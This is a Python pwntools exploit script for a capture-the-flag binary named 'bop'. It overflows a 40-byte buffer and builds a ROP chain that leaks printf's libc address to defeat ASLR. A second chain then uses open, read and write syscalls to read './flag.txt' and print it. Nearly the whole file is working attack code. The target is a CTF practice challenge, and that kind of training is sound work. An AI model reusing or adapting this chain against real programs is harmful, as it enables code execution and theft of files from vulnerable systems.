from pwn import *

# With help of https://ctftime.org/writeup/36159

# REMOTE
# p = remote('localhost', 12345)
# libc = ELF('./libc.so.6')

# LOCAL
p = process('./bop')
gdb.attach(p, gdbscript="b *0x401365")
bop_binary = ELF('./bop')
libc = ELF('/usr/lib/x86_64-linux-gnu/libc.so.6')

rop_bin = ROP(bop_binary)

pop_rdi = rop_bin.find_gadget(['pop rdi', 'ret']).address
pop_rsi_r15 = rop_bin.find_gadget(['pop rsi']).address
ret = rop_bin.find_gadget(['ret']).address
printf_got = bop_binary.got['printf']
printf_plt = bop_binary.plt['printf']
gets_plt = bop_binary.plt['gets']
main_addr = 0x00000000004012f9

leak_exploit = b'A' * 40
leak_exploit += p64(pop_rdi)
leak_exploit += p64(printf_got)
leak_exploit += p64(pop_rsi_r15)
leak_exploit += p64(printf_got)
leak_exploit += p64(printf_got)
leak_exploit += p64(printf_plt)
leak_exploit += p64(ret)
leak_exploit += p64(main_addr)

p.sendline(leak_exploit)
p.recv()
resp_leak = p.recv()
leaked_addr = u64(resp_leak[:resp_leak.find(b'Do')].ljust(8, b'\x00'))
print(f'\nLeaked address of printf: {hex(leaked_addr)}')
leaked_libc = leaked_addr - libc.symbols["printf"]
print(f'Leaked address of libc: {hex(leaked_libc)}')

libc_rop = ROP(libc)
pop_rax = libc_rop.find_gadget(['pop rax', 'ret']).address + leaked_libc
pop_rdx = libc_rop.find_gadget(['pop rdx', 'ret']).address + leaked_libc
syscall = libc_rop.find_gadget(['syscall', 'ret']).address + leaked_libc
bss = bop_binary.bss() + 0x400


# OPEN FILE
leak_exploit = b'A' * 40
leak_exploit += p64(pop_rdi)
leak_exploit += p64(bss)
leak_exploit += p64(gets_plt)

leak_exploit += p64(pop_rdi)
leak_exploit += p64(bss)
leak_exploit += p64(pop_rsi_r15)
leak_exploit += p64(0)
leak_exploit += p64(0)
leak_exploit += p64(pop_rax)
leak_exploit += p64(2)
leak_exploit += p64(pop_rdx)
leak_exploit += p64(0)
leak_exploit += p64(syscall)

# READ FILE
leak_exploit += p64(pop_rax)
leak_exploit += p64(0)
leak_exploit += p64(pop_rsi_r15)
leak_exploit += p64(bss)
leak_exploit += p64(0)
leak_exploit += p64(pop_rdx)
leak_exploit += p64(0xff)
leak_exploit += p64(pop_rdi)
leak_exploit += p64(3)
leak_exploit += p64(syscall)

# WRITE FILE
leak_exploit += p64(pop_rax)
leak_exploit += p64(1)
leak_exploit += p64(pop_rdi)
leak_exploit += p64(1)
leak_exploit += p64(pop_rsi_r15)
leak_exploit += p64(bss)
leak_exploit += p64(0)
leak_exploit += p64(pop_rdx)
leak_exploit += p64(0xff)
leak_exploit += p64(syscall)
leak_exploit += p64(main_addr)

p.sendline(leak_exploit)
p.sendline(b'./flag.txt\x00')

flag = p.recv()
flag = flag[:flag.find(b'\x00')]
print(f'FLAG: {flag}')
